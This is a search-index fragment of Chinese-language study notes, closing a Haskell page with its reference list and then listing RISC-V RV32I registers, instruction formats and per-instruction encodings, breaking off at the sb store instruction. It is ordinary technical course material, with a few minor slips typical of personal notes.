\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u6162\u6162\u5b66\u4e86\uff0c\u8fd9\u4e2a\u5047\u671f\u8fd8\u6709\u597d\u591a\u5176\u5b83\u4e8b\u8981\u5e72\u5462\uff0cHaskell \u8fd9\u8fb9\u5148\u6478\u4e86_(:\u0437\u300d\u2220)_","title":"\u540e\u8bb0"},{"location":"cs/pl/haskell/#reference","text":"Learn You a Haskell Writing foldl using foldr - StackOverflow Haskell\uff1a\u7528foldr\u5b9a\u4e49foldl Typeclassopedia - Haskell wiki Hoogle Functors, Applicatives, And Monads In Pictures Haskell\u5b66\u4e60 - functor Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff088\uff09Monoid - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0816\uff09Alternative - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0840\uff09Arrow\uff081\uff09 - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0847\uff09Arrow\uff082\uff09 - zwvista Haskell/Category theory - wikibooks Category theory - wikipedia \u8303\u7574\u8bba - \u7ef4\u57fa\u767e\u79d1 Monad (category theory) - wikipedia Functor - wikipedia \"The End?\"","title":"Reference"},{"location":"cs/pl/riscv/","text":"RISC-V ISA \u00b6 Abstract RISC-V ISA Unprivileged Spec v.20191213 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u201c\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b \u57fa\u7840\u77e5\u8bc6 \u00b6 RISC-V \u662f\u4e00\u4e2a ISA \u6807\u51c6 RISC-V \u662f\u5b8c\u5168\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u4efb\u4f55\u4eba\u4f7f\u7528 \u7b80\u5355\u3001\u53ef\u6269\u5c55 \u5206\u4e3a\u7528\u6237\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08User-level ISA spec\uff09\u548c\u7279\u6743\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08Privilege ISA spec\uff09\u7b49 \u547d\u540d\u4e3a RV + \u6570\u636e\u5bbd\u5ea6 + \u6269\u5c55 \u6307\u4ee4\u96c6 \u00b6 \u57fa\u7840\u6307\u4ee4\u96c6\uff1aRV32I\u3001RV64I\uff0832/64 \u4f4d\u5e26\u6709\u6574\u578b\u64cd\u4f5c\u7684\u6307\u4ee4\u96c6\uff09\u3001RV32E\uff08\u53ea\u6709 16 \u4e2a\u5bc4\u5b58\u5668\u7684 32 \u4f4d\u6574\u578b\u6307\u4ee4\u96c6\uff09 I\uff1a\u5e26\u6709 ALU \u8fd0\u7b97\u3001\u5206\u652f\u8df3\u8f6c\u3001\u88c5\u8f7d\u5b58\u50a8 \u6269\u5c55\uff1a M\uff1a\u589e\u52a0\u6574\u578b\u4e58\u6cd5\u3001\u9664\u6cd5 A\uff1a\u539f\u5b50\u6307\u4ee4 F\uff1a\u589e\u52a0\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570 D\uff1a\u589e\u52a0\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 Q\uff1a\u589e\u52a0 128 \u4f4d\u56db\u7cbe\u5ea6\u6d6e\u70b9\u6570 G\uff1a= IMAFD ... \u6269\u5c55\u4e86\u7684\u6307\u4ee4\u96c6\u5219\u547d\u540d\u4e3a RV32IM\u3001RV32IMA\u3001RV32G \u7b49\u7b49 \u7f16\u8bd1\u8fd0\u884c \u00b6 \u7f16\u8bd1 \u00b6 \u7f16\u8bd1\u4f7f\u7528 riscv-collab/riscv-gnu-toolchain \u9700\u8981\u624b\u52a8\u514b\u9686\u6e90\u7801\uff08\u6781\u5927\uff09\uff0c\u518d\u7f16\u8bd1\uff0c\u65f6\u95f4\u5f88\u957f \u7f16\u8bd1\u65f6\u6ce8\u610f prefix \u548c\u9009\u62e9\u6307\u4ee4\u96c6 --with-arch make linux \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-linux-gnu- xxx \uff0c\u4f7f\u7528 glibc \u6807\u51c6\u5e93\uff0c\u652f\u6301\u52a8\u6001\u94fe\u63a5 make \u6216 make newlib \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-elf- xxx \uff0c\u4f7f\u7528 riscv-newlib\uff0c\u53ea\u80fd\u9759\u6001\u94fe\u63a5 \u7f16\u8bd1 c \u4ee3\u7801\u4f7f\u7528 riscv xx -unknown- xxx -gcc \u5c31\u53ef\u4ee5\u4e86\uff0c\u6ce8\u610f\u6307\u5b9a -march \u548c -mabi\uff0c\u6bd4\u5982\u52a0\u4e0a -march=rv32i -mabi=ilp32 \u540e\u7f16\u8bd1\u51fa\u6765\u7684\u5c31\u662f\u4f7f\u7528 RV32I \u6307\u4ee4\u96c6\u7684\u673a\u5668\u7801 \u8fd0\u884c \u00b6 \u56e0\u4e3a RISC-V \u662f\u53e6\u4e00\u79cd\u67b6\u6784\uff0c\u4e0d\u80fd\u5728 x86 \u673a\u5668\u4e0a\u76f4\u63a5\u8fd0\u884c\uff0c\u6240\u4ee5\u8981\u4f7f\u7528 qemu \u6765\u8fd0\u884c\u3002qemu \u76f4\u63a5\u4e0b\u8f7d\u5c31\u53ef\u4ee5\uff0c\u4e00\u822c\u90fd\u4f1a\u81ea\u5e26 RISC-V \u7684\u6a21\u62df\u5668\uff0c\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u7f16\u8bd1\u51fa RISC-V RV32I \u57fa\u7840 \u00b6 \u5bc4\u5b58\u5668 \u00b6 \u4e00\u4e2a PC \u5bc4\u5b58\u5668\uff08program counter\uff09 32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08x0~x31\uff09 \u5176\u4e2d x0 \u6c38\u8fdc\u662f 0 \u5bc4\u5b58\u5668\u7684\u5e38\u7528\u7528\u9014\u5982\u4e0b\uff1a \u5bc4\u5b58\u5668 ABI \u540d\u79f0 \u7528\u9014\u63cf\u8ff0 saver x0 zero \u786c\u4ef6 0 x1 ra \u8fd4\u56de\u5730\u5740\uff08return address\uff09 caller x2 sp \u6808\u6307\u9488\uff08stack pointer\uff09 callee x3 gp \u5168\u5c40\u6307\u9488\uff08global pointer\uff09 x4 tp \u7ebf\u7a0b\u6307\u9488\uff08thread pointer\uff09 x5 t0 \u4e34\u65f6\u53d8\u91cf/\u5907\u7528\u94fe\u63a5\u5bc4\u5b58\u5668\uff08alternate link reg\uff09 caller x6-7 t1-2 \u4e34\u65f6\u53d8\u91cf caller x8 s0/fp \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668/\u5e27\u6307\u9488\uff08frame pointer\uff09 callee x9 s1 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x10-11 a0-1 \u51fd\u6570\u53c2\u6570/\u8fd4\u56de\u503c caller x12-17 a2-7 \u51fd\u6570\u53c2\u6570 caller x18-27 s2-11 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x28-31 t3-6 \u4e34\u65f6\u53d8\u91cf caller \u5176\u4e2d sp s0-11 \u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u8bc1\u4e00\u81f4\uff0c\u5176\u5b83\u4e0d\u7528\u4fdd\u8bc1 \u6307\u4ee4\u683c\u5f0f \u00b6 RV32I \u6709 4 \u79cd\u57fa\u7840\u7684\u6307\u4ee4\u683c\u5f0f\uff08R/I/S/U\uff09\uff0c\u518d\u6839\u636e\u7acb\u5373\u6570\u89e3\u7801\u7684\u4e0d\u540c\u53c8\u5206\u51fa\u4e24\u79cd\uff08B/J\uff09\uff0c\u603b\u5171\u516d\u79cd\u6307\u4ee4\u683c\u5f0f R \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 funct7 rs2 rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7531 opcode funct3 funct7 \u51b3\u5b9a\uff0crd = rs1 op rs2\uff08shift \u7c7b\u4f8b\u5916\uff0c\u5b83\u4eec\u7528 rs2 \u4f4d\u7f6e\u8868\u793a\u79fb\u4f4d\u6570\u7684\u7acb\u5373\u6570\uff09 I \u578b\u6307\u4ee4 \u00b6 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u548c\u7acb\u5373\u6570\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\uff0c\u4ee5\u53ca load \u7c7b\u6307\u4ee4\u7b49\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7c7b\u578b\u7b49\u7531 opcode funct3 \u51b3\u5b9a\uff0c\u5982\u679c\u662f ALU \u8fd0\u7b97\uff0c\u5219 rd = rs1 op imm \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:20]}\uff0c\u4e5f\u5c31\u662f\u5bf9 imm[11:0] \u8fdb\u884c\u7b26\u53f7\u4f4d\u6269\u5c55\u5230 32 \u4f4d S \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 funct3 imm[4:0] opcode store \u7c7b\u6307\u4ee4\uff0cstore \u7684\u5927\u5c0f\u7531 funct3 \u51b3\u5b9a\uff0c\u4ee5\u53d8\u5740\u6a21\u5f0f\u8fdb\u884c\u5bfb\u5740\uff0c\u5373 rs1 = [rs2+imm] \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:25], inst[11:7]} B \u578b\u6307\u4ee4 \u00b6 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 funct3 imm[4:1,11] opcode \u7531 S \u578b\u6307\u4ee4\u5206\u6765\uff0c\u4e0e\u4e4b\u533a\u522b\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u987a\u5e8f\u4e0d\u540c\uff0c\u662f\u6240\u6709\u5206\u652f\u7c7b\u6307\u4ee4\u3002\u662f\u5426\u5206\u652f\u7531 funct3 rs1 rs2 \u51b3\u5b9a \u7acb\u5373\u6570\u662f {{19{inst[31]}}, inst[31], inst[7], inst[30:25], inst[11:8], 1'b0} U \u578b\u6307\u4ee4 \u00b6 31 12 11 7 6 0 imm[31:12] rd opcode LUI \u548c AUIPC\uff0c\u7acb\u5373\u6570\u90fd\u662f\u5728\u9ad8 20 \u4f4d\uff0c\u800c\u4e14\u6ca1\u6709\u6e90\u64cd\u4f5c\u6570 \u7acb\u5373\u6570\u662f {inst[31:12], 12'b0} J \u578b\u6307\u4ee4 \u00b6 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd opcode \u7531 U \u578b\u6307\u4ee4\u5206\u6765\uff0c\u533a\u522b\u4e5f\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u4e0d\u540c\uff0c\u4ec5\u6709 JAL \u4e00\u4e2a\u6307\u4ee4 \u7acb\u5373\u6570\u662f {{11{inst[31]}}, inst[31], inst[19:12], inst[20], inst[30:21], 1'b0} RV32I \u6307\u4ee4 \u00b6 \u6574\u578b\u8ba1\u7b97\u6307\u4ee4 \u00b6 \u52a0\u51cf\u6cd5\u6307\u4ee4 \u00b6 add R \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aadd rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 sub r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asub rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 - rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 addi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aaddi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + imm \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565\uff0cimm \u5728 [-2048, 2047] \u8303\u56f4\u5185 \u6bd4\u8f83\u8fd0\u7b97\u6307\u4ee4 \u00b6 slt r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 010 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aslt rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltu r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 011 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asltu rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 slti I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslti rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltiu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asltiu rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate unsigned\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0crs1 imm \u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 \u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u6307\u4ee4 \u00b6 and r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 111 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aand rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & rs2 \u6309\u4f4d\u4e0e or r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 110 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | rs2 \u6309\u4f4d\u6216 xor r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 100 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1axor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ rs2 \u6309\u4f4d\u5f02\u6216 andi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 111 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aandi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & imm \u6309\u4f4d\u4e0e \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d ori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 110 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | imm \u6309\u4f4d\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d xori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1axori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ imm \u6309\u4f4d\u5f02\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d\uff08xori rd, rs1, -1 \u76f8\u5f53\u4e8e rd = ~rs1\uff09 \u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4 \u00b6 sll r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asll rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << rs2[4:0] \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u6570\u503c\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 srl r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asrl rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> rs2[4:0] \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d sra r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asra rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> rs2[4:0] \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 slli r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << shamt \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srli r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> shamt \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srai r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrai rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> shamt \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d \u6570\u636e\u52a0\u8f7d\u6307\u4ee4 \u00b6 lui U \u578b 31 12 11 7 6 0 imm[31:12] rd 0110111 \u6307\u4ee4\u683c\u5f0f \uff1alui imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08load upper immediate\uff09rd = imm << 12 \u5c06 imm \u52a0\u8f7d\u5230 rd \u7684\u9ad8 20 \u4f4d \u6ce8\u610f \uff1aimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d\uff0crd \u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u5c31\u662f imm \u540e\u63a5\u4e09\u4e2a 0 auipc U \u578b 31 12 11 7 6 0 imm[31:12] rd 0010111 \u6307\u4ee4\u683c\u5f0f \uff1aauipc rd \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08add upper immediate with pc\uff09rd = pc + imm << 12 \u5c06 imm \u52a0\u8f7d\u5230\u9ad8 20 \u4f4d\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c \u6ce8\u610f \uff1a\u5e38\u7528\u6765\u6784\u5efa pc \u76f8\u5bf9\u5bfb\u5740\u7684\u5730\u5740\uff0cimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d \u63a7\u5236\u6d41\u53d8\u5316\u6307\u4ee4 \u00b6 jump \u7c7b\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 jal J \u578b 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd 1101111 \u6307\u4ee4\u683c\u5f0f \uff1ajal rd, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08jump and link\uff09rd = pc+4, pc = pc+imm \u5373\u5c06\u5f53\u524d\u6307\u4ee4\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5b58\u5165 rd\uff0c\u7136\u540e\u76f8\u5bf9\u8df3\u8f6c\u5230 imm \u5904 \u6ce8\u610f \uff1aimm \u5728\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u4e00\u822c\u7528\u6807\u53f7\u6765\u6307\u5b9a\uff0cjal \u53ef\u4ee5\u8df3\u5230 \u00b11MiB \u8303\u56f4\u5185\u7684\u4ee3\u7801 jalr I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 1100111 \u6307\u4ee4\u683c\u5f0f \uff1ajalr rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1ard = pc+4, pc = (imm+rs1) & 0xFFFFFFFE \u5373\u6700\u4f4e\u4f4d\u4f1a\u88ab\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u4f4d\u7f6e\u8df3\u8f6c branch \u7c7b\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4 \u00b6 beq B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 000 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abeq rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if equal\uff09\u5982\u679c rs1 == rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bne B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 001 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abne rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if not equal\uff09\u5982\u679c rs1 != rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 blt B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 100 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1ablt rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if less than\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bge B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 101 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abge rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if greater than or equal\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bltu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 110 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abltu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08blt unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bgeu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 111 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abgeu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08bge unsigned\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 \u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4 \u00b6 load \u7c7b\u88c5\u8f7d\u6307\u4ee4 \u00b6 lb I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alb rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5230 rd \u4f4e\u516b\u4f4d\uff0c\u518d\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lh I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 001 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alh rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1+imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 16 \u4f4d\u6570\u5230 rd \u4f4e 16 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alw rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d lbu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1albu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u653e\u5230 rd \u4f4e 8 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8\u4f4d\u5168\u8865 0\uff09 lhu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alhu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6 16 \u4f4d\u6570\u5b58\u5165 rd\uff0c\u5e76\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8 16 \u4f4d\u5168\u4e3a 0\uff09 store \u7c7b\u5b58\u50a8\u6307\u4ee4 \u00b6 sb S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 000 imm[4:0] 0100011 